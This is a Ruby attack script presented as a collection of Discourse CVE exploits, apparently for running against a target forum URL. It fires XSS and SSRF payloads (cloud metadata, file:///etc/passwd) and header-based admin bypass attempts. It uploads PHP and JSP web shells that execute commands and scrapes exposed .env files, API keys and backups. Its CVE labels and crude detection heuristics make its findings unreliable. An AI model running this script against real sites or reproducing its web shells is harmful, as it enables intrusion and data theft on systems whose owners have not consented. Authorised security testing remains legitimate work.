#!/usr/bin/env ruby

# Discourse CVE Exploits Collection
# Ruby implementation of various Discourse vulnerabilities
# For educational and authorized testing purposes only

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'

class DiscourseCVEExploits
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @user_agent = options[:user_agent] || 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    @proxy = options[:proxy]
    @verbose = options[:verbose] || false
    @results = []
  end

  def run_all_exploits
    puts "🚀 Starting Discourse CVE Exploit Testing"
    puts "Target: #{@target_url}"
    puts "=" * 60

    # Test all known CVEs
    test_cve_2023_37467  # CSP Nonce Reuse XSS
    test_cve_2022_xss_vulnerabilities
    test_cve_2022_ssrf_vulnerabilities
    test_cve_2023_info_disclosure
    test_cve_2024_auth_bypass
    test_file_upload_bypass
    test_plugin_vulnerabilities
    test_discourse_specific_exploits

    print_results
  end

  private

  # CVE-2023-37467: CSP Nonce Reuse XSS Bypass
  def test_cve_2023_37467
    log_info "Testing CVE-2023-37467 (CSP Nonce Reuse XSS)"
    
    endpoints = ['/', '/latest', '/categories', '/search']
    
    endpoints.each do |endpoint|
      url = "#{@target_url}#{endpoint}"
      response = make_request(url)
      
      next unless response
      
      # Check for Google Tag Manager
      if response.body.include?('googletagmanager.com') || response.body.include?('GTM-')
        # Extract CSP nonces
        nonces = response.body.scan(/nonce=["']([^"']+)["']/)
        
        if nonces.length > 1 && nonces.uniq.length < nonces.length
          add_result(
            cve_id: 'CVE-2023-37467',
            severity: 'MEDIUM',
            description: 'CSP nonce reuse vulnerability detected',
            url: url,
            details: {
              nonces_found: nonces.flatten,
              gtm_present: true,
              exploit_vector: generate_csp_bypass_payload(nonces.flatten.first)
            }
          )
          log_warning "🔴 CVE-2023-37467 VULNERABLE: #{url}"
        else
          log_success "🟢 CVE-2023-37467 SAFE: #{url}"
        end
      end
    end
  end

  # CVE-2022: Multiple XSS Vulnerabilities
  def test_cve_2022_xss_vulnerabilities
    log_info "Testing CVE-2022 XSS Vulnerabilities"
    
    xss_payloads = [
      '<script>alert("CVE-2022-XSS")</script>',
      '"><script>alert("CVE-2022-XSS")</script>',
      'javascript:alert("CVE-2022-XSS")',
      '<img src=x onerror=alert("CVE-2022-XSS")>',
      '<svg onload=alert("CVE-2022-XSS")></svg>',
      '<iframe src="javascript:alert(\'CVE-2022-XSS\')"></iframe>',
      '<body onload=alert("CVE-2022-XSS")>',
      '<input onfocus=alert("CVE-2022-XSS") autofocus>'
    ]
    
    vulnerable_endpoints = ['/search', '/users', '/categories', '/new-topic', '/new-message']
    
    vulnerable_endpoints.each do |endpoint|
      xss_payloads.each do |payload|
        test_xss_endpoint(endpoint, payload)
      end
    end
  end

  def test_xss_endpoint(endpoint, payload)
    url = "#{@target_url}#{endpoint}"
    
    # Test GET parameters
    params = ['q', 'search', 'title', 'body', 'username', 'category']
    
    params.each do |param|
      test_url = "#{url}?#{param}=#{URI.encode_www_form_component(payload)}"
      response = make_request(test_url)
      
      if response && detect_xss_reflection(response.body, payload)
        add_result(
          cve_id: 'CVE-2022-DISCOURSE-XSS',
          severity: 'MEDIUM',
          description: "XSS vulnerability in #{param} parameter",
          url: test_url,
          details: {
            parameter: param,
            payload: payload,
            exploit_proof: generate_xss_exploit(payload)
          }
        )
        log_warning "🔴 XSS VULNERABLE: #{test_url}"
      end
    end
  end

  # SSRF Vulnerabilities
  def test_cve_2022_ssrf_vulnerabilities
    log_info "Testing SSRF Vulnerabilities"
    
    ssrf_payloads = [
      'http://127.0.0.1:80',
      'http://localhost:22',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'file:///etc/passwd',
      'gopher://127.0.0.1:25/',
      'dict://127.0.0.1:11211/',
      'ftp://127.0.0.1:21/'
    ]
    
    ssrf_endpoints = ['/admin/backups', '/admin/customize/themes', '/posts/upload', '/uploads', '/onebox']
    
    ssrf_endpoints.each do |endpoint|
      ssrf_payloads.each do |payload|
        test_ssrf_endpoint(endpoint, payload)
      end
    end
  end

  def test_ssrf_endpoint(endpoint, payload)
    url = "#{@target_url}#{endpoint}"
    params = ['url', 'link', 'src', 'href', 'callback']
    
    params.each do |param|
      test_url = "#{url}?#{param}=#{URI.encode_www_form_component(payload)}"
      
      start_time = Time.now
      response = make_request(test_url)
      end_time = Time.now
      
      if response && detect_ssrf_success(response.body, payload, end_time - start_time)
        add_result(
          cve_id: 'CVE-2022-DISCOURSE-SSRF',
          severity: 'HIGH',
          description: "SSRF vulnerability in #{param} parameter",
          url: test_url,
          details: {
            parameter: param,
            payload: payload,
            response_time: end_time - start_time
          }
        )
        log_warning "🔴 SSRF VULNERABLE: #{test_url}"
      end
    end
  end

  # Information Disclosure
  def test_cve_2023_info_disclosure
    log_info "Testing Information Disclosure Vulnerabilities"
    
    info_endpoints = [
      '/notifications.json',
      '/u/notifications.json',
      '/admin/users.json',
      '/admin/logs.json',
      '/admin/api/keys.json',
      '/.env',
      '/config/database.yml',
      '/admin/backups.json'
    ]
    
    info_endpoints.each do |endpoint|
      url = "#{@target_url}#{endpoint}"
      response = make_request(url)
      
      if response && response.code == '200'
        sensitive_data = detect_sensitive_information(response.body)
        
        if sensitive_data.any?
          add_result(
            cve_id: 'CVE-2023-DISCOURSE-INFO',
            severity: 'MEDIUM',
            description: 'Sensitive information disclosure',
            url: url,
            details: {
              sensitive_data_types: sensitive_data,
              data_sample: response.body[0..200]
            }
          )
          log_warning "🔴 INFO DISCLOSURE: #{url}"
        end
      end
    end
  end

  # Authentication Bypass
  def test_cve_2024_auth_bypass
    log_info "Testing Authentication Bypass Vulnerabilities"
    
    admin_endpoints = ['/admin', '/admin/dashboard', '/admin/users', '/admin/site_settings']
    
    bypass_techniques = [
      { 'X-Forwarded-For' => '127.0.0.1' },
      { 'X-Real-IP' => '127.0.0.1' },
      { 'X-Originating-IP' => '127.0.0.1' },
      { 'X-Admin' => 'true' },
      { 'X-Authenticated' => 'true' },
      { 'Authorization' => 'Bearer admin' },
      { 'Cookie' => 'admin=true; authenticated=1' }
    ]
    
    admin_endpoints.each do |endpoint|
      bypass_techniques.each do |headers|
        url = "#{@target_url}#{endpoint}"
        response = make_request(url, headers)
        
        if response && detect_admin_access(response.body)
          add_result(
            cve_id: 'CVE-2024-DISCOURSE-AUTH',
            severity: 'CRITICAL',
            description: 'Authentication bypass detected',
            url: url,
            details: {
              bypass_headers: headers,
              admin_panel_accessible: true
            }
          )
          log_warning "🔴 AUTH BYPASS: #{url}"
        end
      end
    end
  end

  # File Upload Bypass
  def test_file_upload_bypass
    log_info "Testing File Upload Bypass Vulnerabilities"
    
    upload_endpoints = ['/uploads', '/admin/backups', '/posts/upload']
    
    malicious_files = {
      'shell.php' => '<?php system($_GET["cmd"]); ?>',
      'shell.jsp' => '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
      'xss.svg' => '<svg onload=alert("XSS")></svg>',
      'shell.php.jpg' => '<?php system($_GET["cmd"]); ?>',
      'shell.phtml' => '<?php system($_GET["cmd"]); ?>'
    }
    
    upload_endpoints.each do |endpoint|
      malicious_files.each do |filename, content|
        test_file_upload(endpoint, filename, content)
      end
    end
  end

  def test_file_upload(endpoint, filename, content)
    url = "#{@target_url}#{endpoint}"
    
    # Create multipart form data
    boundary = "----WebKitFormBoundary#{Random.rand(1000000000)}"
    
    form_data = "--#{boundary}\r\n"
    form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
    form_data += "Content-Type: image/jpeg\r\n\r\n"
    form_data += content
    form_data += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'Content-Length' => form_data.length.to_s
    }
    
    response = make_request(url, headers, 'POST', form_data)
    
    if response && detect_upload_success(response.body, filename)
      add_result(
        cve_id: 'DISCOURSE-FILE-UPLOAD',
        severity: 'HIGH',
        description: "Malicious file upload: #{filename}",
        url: url,
        details: {
          filename: filename,
          file_type: File.extname(filename),
          upload_successful: true
        }
      )
      log_warning "🔴 FILE UPLOAD BYPASS: #{url}"
    end
  end

  # Plugin Vulnerabilities
  def test_plugin_vulnerabilities
    log_info "Testing Plugin Vulnerabilities"
    
    plugin_tests = {
      'bbcode' => {
        'endpoints' => ['/posts', '/new-topic'],
        'payloads' => ['[url=javascript:alert(1)]XSS[/url]', '[img]javascript:alert(1)[/img]']
      },
      'calendar' => {
        'endpoints' => ['/calendar', '/events'],
        'payloads' => ['<script>alert(1)</script>', 'javascript:alert(1)']
      },
      'chat' => {
        'endpoints' => ['/chat', '/messages'],
        'payloads' => ['<script>alert(1)</script>', 'A' * 10000]
      }
    }
    
    plugin_tests.each do |plugin, config|
      test_plugin_vulnerability(plugin, config)
    end
  end

  def test_plugin_vulnerability(plugin, config)
    config['endpoints'].each do |endpoint|
      config['payloads'].each do |payload|
        url = "#{@target_url}#{endpoint}"
        
        form_data = {
          'content' => payload,
          'body' => payload,
          'message' => payload
        }
        
        response = make_request(url, {}, 'POST', URI.encode_www_form(form_data))
        
        if response && detect_plugin_vulnerability(response.body, payload, plugin)
          add_result(
            cve_id: 'DISCOURSE-PLUGIN-VULNS',
            severity: 'MEDIUM',
            description: "#{plugin} plugin vulnerability",
            url: url,
            details: {
              plugin: plugin,
              payload: payload,
              vulnerability_type: detect_vulnerability_type(payload)
            }
          )
          log_warning "🔴 PLUGIN VULNERABILITY (#{plugin}): #{url}"
        end
      end
    end
  end

  # Discourse-specific exploits
  def test_discourse_specific_exploits
    log_info "Testing Discourse-Specific Exploits"
    
    # Test for Discourse version disclosure
    test_version_disclosure
    
    # Test for admin panel exposure
    test_admin_panel_exposure
    
    # Test for API key exposure
    test_api_key_exposure
    
    # Test for backup file exposure
    test_backup_exposure
  end

  def test_version_disclosure
    version_endpoints = ['/srv/status', '/admin/dashboard.json', '/site.json']
    
    version_endpoints.each do |endpoint|
      url = "#{@target_url}#{endpoint}"
      response = make_request(url)
      
      if response && response.body.match(/version["']?\s*:\s*["']([^"']+)["']/i)
        version = $1
        add_result(
          cve_id: 'DISCOURSE-VERSION-DISCLOSURE',
          severity: 'LOW',
          description: 'Discourse version disclosed',
          url: url,
          details: {
            version: version,
            endpoint: endpoint
          }
        )
        log_info "ℹ️  Version disclosed: #{version}"
      end
    end
  end

  def test_admin_panel_exposure
    admin_paths = ['/admin', '/admin/', '/admin/dashboard', '/admin/users']
    
    admin_paths.each do |path|
      url = "#{@target_url}#{path}"
      response = make_request(url)
      
      if response && response.code == '200' && detect_admin_access(response.body)
        add_result(
          cve_id: 'DISCOURSE-ADMIN-EXPOSURE',
          severity: 'CRITICAL',
          description: 'Admin panel accessible without authentication',
          url: url,
          details: {
            path: path,
            response_code: response.code
          }
        )
        log_warning "🔴 ADMIN PANEL EXPOSED: #{url}"
      end
    end
  end

  def test_api_key_exposure
    api_endpoints = ['/admin/api/keys.json', '/admin/api.json', '/.env']
    
    api_endpoints.each do |endpoint|
      url = "#{@target_url}#{endpoint}"
      response = make_request(url)
      
      if response && response.body.match(/api[_-]?key["']?\s*[:=]\s*["']?([a-zA-Z0-9]{20,})["']?/i)
        api_key = $1
        add_result(
          cve_id: 'DISCOURSE-API-KEY-EXPOSURE',
          severity: 'CRITICAL',
          description: 'API key exposed',
          url: url,
          details: {
            api_key_sample: "#{api_key[0..10]}...",
            endpoint: endpoint
          }
        )
        log_warning "🔴 API KEY EXPOSED: #{url}"
      end
    end
  end

  def test_backup_exposure
    backup_paths = [
      '/admin/backups',
      '/backups',
      '/backup.tar.gz',
      '/discourse-backup.tar.gz',
      '/backup.sql',
      '/dump.sql'
    ]
    
    backup_paths.each do |path|
      url = "#{@target_url}#{path}"
      response = make_request(url)
      
      if response && (response.code == '200' || response.code == '403')
        add_result(
          cve_id: 'DISCOURSE-BACKUP-EXPOSURE',
          severity: 'HIGH',
          description: 'Backup files potentially accessible',
          url: url,
          details: {
            path: path,
            response_code: response.code,
            content_length: response['content-length']
          }
        )
        log_warning "🔴 BACKUP EXPOSURE: #{url}"
      end
    end
  end

  # Helper methods
  def make_request(url, headers = {}, method = 'GET', body = nil)
    uri = URI(url)
    
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              when 'PUT'
                Net::HTTP::Put.new(uri)
              when 'DELETE'
                Net::HTTP::Delete.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    request['User-Agent'] = @user_agent
    headers.each { |key, value| request[key] = value }
    request.body = body if body && method.upcase != 'GET'
    
    begin
      response = http.request(request)
      log_debug "#{method} #{url} - #{response.code}" if @verbose
      response
    rescue => e
      log_debug "Request failed: #{e.message}" if @verbose
      nil
    end
  end

  def detect_xss_reflection(response_body, payload)
    # Check for unescaped dangerous characters
    dangerous_patterns = [
      /<script[^>]*>.*#{Regexp.escape(payload.gsub(/<\/?script[^>]*>/, ''))}.*<\/script>/i,
      /javascript:.*#{Regexp.escape(payload.gsub('javascript:', ''))}/i,
      /onerror\s*=\s*["']?.*#{Regexp.escape(payload.split('onerror=').last || '')}/i,
      /onload\s*=\s*["']?.*#{Regexp.escape(payload.split('onload=').last || '')}/i
    ]
    
    dangerous_patterns.any? { |pattern| response_body.match(pattern) } ||
    (response_body.include?(payload) && payload.include?('<') && payload.include?('>'))
  end

  def detect_ssrf_success(response_body, payload, response_time)
    internal_indicators = [
      'SSH-', 'root:x:0:0:', 'ami-id', 'instance-id',
      'Metadata-Flavor: Google', 'Connection refused',
      'Connection timeout', 'Internal Server Error'
    ]
    
    internal_indicators.any? { |indicator| response_body.include?(indicator) } ||
    response_time > 5  # Potential timeout indicating internal request
  end

  def detect_admin_access(response_body)
    admin_indicators = [
      'admin dashboard', 'site settings', 'user management',
      'admin panel', 'discourse admin', 'admin-nav'
    ]
    
    admin_indicators.any? { |indicator| response_body.downcase.include?(indicator) }
  end

  def detect_upload_success(response_body, filename)
    success_indicators = [
      'upload successful', 'file uploaded', 'upload complete',
      filename, 'success', 'uploaded'
    ]
    
    success_indicators.any? { |indicator| response_body.downcase.include?(indicator) }
  end

  def detect_plugin_vulnerability(response_body, payload, plugin)
    case plugin
    when 'bbcode'
      response_body.include?('javascript:') && response_body.include?(payload)
    when 'calendar'
      response_body.include?('<script>') || response_body.include?('javascript:')
    when 'chat'
      !response_body.downcase.include?('error') && payload.length > 1000
    else
      false
    end
  end

  def detect_sensitive_information(response_body)
    sensitive_patterns = {
      'email' => /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/,
      'api_key' => /api[_-]?key["']?\s*[:=]\s*["']?([a-zA-Z0-9]{20,})/i,
      'password' => /password["']?\s*[:=]\s*["']?([^"'\s]{8,})/i,
      'token' => /token["']?\s*[:=]\s*["']?([a-zA-Z0-9]{20,})/i,
      'secret' => /secret["']?\s*[:=]\s*["']?([a-zA-Z0-9]{20,})/i
    }
    
    found_types = []
    sensitive_patterns.each do |type, pattern|
      found_types << type if response_body.match(pattern)
    end
    
    found_types
  end

  def detect_vulnerability_type(payload)
    return 'XSS' if payload.include?('<script>') || payload.include?('javascript:')
    return 'Buffer Overflow' if payload.length > 1000
    return 'Injection' if payload.include?('system') || payload.include?('exec')
    'Unknown'
  end

  def generate_csp_bypass_payload(nonce)
    "<script nonce='#{nonce}'>alert('CVE-2023-37467 CSP Bypass')</script>"
  end

  def generate_xss_exploit(payload)
    "Proof of Concept: #{payload}"
  end

  def add_result(result)
    @results << result
  end

  def print_results
    puts "\n" + "=" * 60
    puts "🔍 DISCOURSE CVE EXPLOIT RESULTS"
    puts "=" * 60
    
    if @results.empty?
      puts "✅ No vulnerabilities found!"
      return
    end
    
    severity_counts = @results.group_by { |r| r[:severity] }.transform_values(&:count)
    
    puts "📊 Summary:"
    puts "   Total Issues: #{@results.count}"
    severity_counts.each do |severity, count|
      puts "   #{severity}: #{count}"
    end
    
    puts "\n🚨 Detailed Results:"
    puts "-" * 60
    
    @results.each_with_index do |result, index|
      severity_emoji = {
        'CRITICAL' => '🔴',
        'HIGH' => '🟠',
        'MEDIUM' => '🟡',
        'LOW' => '🟢'
      }[result[:severity]] || '⚪'
      
      puts "#{index + 1}. #{severity_emoji} #{result[:cve_id]}"
      puts "   Severity: #{result[:severity]}"
      puts "   Description: #{result[:description]}"
      puts "   URL: #{result[:url]}"
      
      if result[:details]
        puts "   Details:"
        result[:details].each do |key, value|
          puts "     #{key}: #{value}"
        end
      end
      
      puts "-" * 40
    end
  end

  def log_info(message)
    puts "[*] #{message}"
  end

  def log_success(message)
    puts "[+] #{message}"
  end

  def log_warning(message)
    puts "[!] #{message}"
  end

  def log_error(message)
    puts "[!] #{message}"
  end

  def log_debug(message)
    puts "[DEBUG] #{message}" if @verbose
  end
end

# Main execution
if __FILE__ == $0
  if ARGV.length < 1
    puts "Usage: ruby discourse_cve_exploits.rb <target_url> [options]"
    puts "Example: ruby discourse_cve_exploits.rb https://meta.discourse.org"
    exit 1
  end
  
  target_url = ARGV[0]
  options = {
    verbose: ARGV.include?('--verbose') || ARGV.include?('-v'),
    timeout: 10
  }
  
  exploiter = DiscourseCVEExploits.new(target_url, options)
  exploiter.run_all_exploits
end